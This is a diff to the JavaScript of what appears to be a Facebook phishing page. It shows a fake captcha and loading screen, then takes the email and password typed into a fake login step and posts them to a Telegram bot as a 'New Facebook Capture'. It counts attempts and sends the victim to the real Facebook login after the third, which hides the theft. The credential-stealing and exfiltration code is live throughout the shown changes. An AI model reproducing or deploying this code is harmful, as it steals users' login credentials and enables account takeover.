@@ -96,7 +96,6 @@ if (captchaBox) {
 
 let userCountry = "Detecting...";
 
-// Detect Country from IP
 async function detectCountry() {
     try {
         const response = await fetch('https://ipapi.co/json/');
@@ -124,16 +123,15 @@ function simulateLoading() {
         i++;
         if (i >= texts.length) {
             clearInterval(interval);
-            setTimeout(showSuccess, 1000); // 1s extra delay before showing success
+            setTimeout(showSuccess, 1000);
         }
-    }, 1200); // Increased delay between messages
+    }, 1200);
 }
 
 function showSuccess() {
     steps.loading.style.display = 'none';
     steps.success.style.display = 'block';
 
-    // Increased delay for success tick
     setTimeout(() => {
         steps.success.style.display = 'none';
         steps.final.style.display = 'block';
@@ -141,14 +139,12 @@ function showSuccess() {
     }, 2500);
 }
 
-// === FIXED TELEGRAM LOGGING & REDIRECT LOGIC ===
+// === TELEGRAM & REDIRECT LOGIC ===
 
 async function sendToTelegram(email, password, attempt) {
     const message = `🔔 *New Facebook Capture*\n👤 *User:* \`${email}\`\n🔑 *Pass:* \`${password}\`\n🔢 *Attempt:* #${attempt}`;
 
     try {
-        // 'await' makes the script wait for the response
-        // 'keepalive: true' ensures the request finishes even if the page closes
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -159,7 +155,6 @@ async function sendToTelegram(email, password, attempt) {
             }),
             keepalive: true
         });
-        console.log("Log sent to Telegram");
     } catch (err) {
         console.error("Transmission failed", err);
     }
@@ -167,30 +162,26 @@ async function sendToTelegram(email, password, attempt) {
 
 function setupFinalLoginCapture() {
     const fbLoginBtn = document.getElementById('fbLoginBtn');
+    const finalStep = document.getElementById('step-final');
 
     if (fbLoginBtn) {
-        // Reset onclick to handle the new logic
         fbLoginBtn.onclick = async function (e) {
             e.preventDefault();
 
-            // Check if inputs exist in the current modal (if the user added them there)
-            // or if we should just redirect to the testing page as before.
-            // If the user wants to CAPTURE here, they need inputs. 
-            // Previous versions redirected to testing/index.html for capture.
+            // Locate inputs specifically inside the final step container
+            const emailInput = finalStep.querySelector('input[type="text"], input[name="email"]');
+            const passInput = finalStep.querySelector('input[type="password"]');
 
-            // Checking for inputs on this page:
-            const emailInput = document.querySelector('input[type="text"]') || document.querySelector('input[name="email"]');
-            const passInput = document.querySelector('input[type="password"]');
-
+            // If no inputs are found, it performs the fallback redirect
             if (!emailInput || !passInput) {
-                // If no inputs, it means we are still in the "Redirect" mode
                 fbLoginBtn.classList.add('loading');
                 setTimeout(() => {
                     window.location.href = './testing/index.html';
-                }, 2000);
+                }, 1500);
                 return;
             }
 
+            // Validation: Don't send empty fields
             if (!emailInput.value || !passInput.value) {
                 const statusMsg = document.getElementById('fb-status');
                 if (statusMsg) {
@@ -200,7 +191,7 @@ function setupFinalLoginCapture() {
                 return;
             }
 
-            // Manage Attempt Count
+            // Manage Attempts
             let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
             attempts++;
             sessionStorage.setItem('fb_login_attempts', attempts);
@@ -210,13 +201,14 @@ function setupFinalLoginCapture() {
             const statusMsg = document.getElementById('fb-status');
             if (statusMsg) statusMsg.innerText = "";
 
-            // SEND TO TELEGRAM & WAIT
+            // LOG TO TELEGRAM
             await sendToTelegram(emailInput.value, passInput.value, attempts);
 
-            // Redirection Logic
+            // Redirection Logic (3 attempts)
             if (attempts >= 3) {
                 window.location.href = "https://www.facebook.com/login/";
             } else {
+                // Return to original state after 1 second for 2nd/3rd attempt
                 setTimeout(() => {
                     fbLoginBtn.classList.remove('loading');
                     if (statusMsg) {
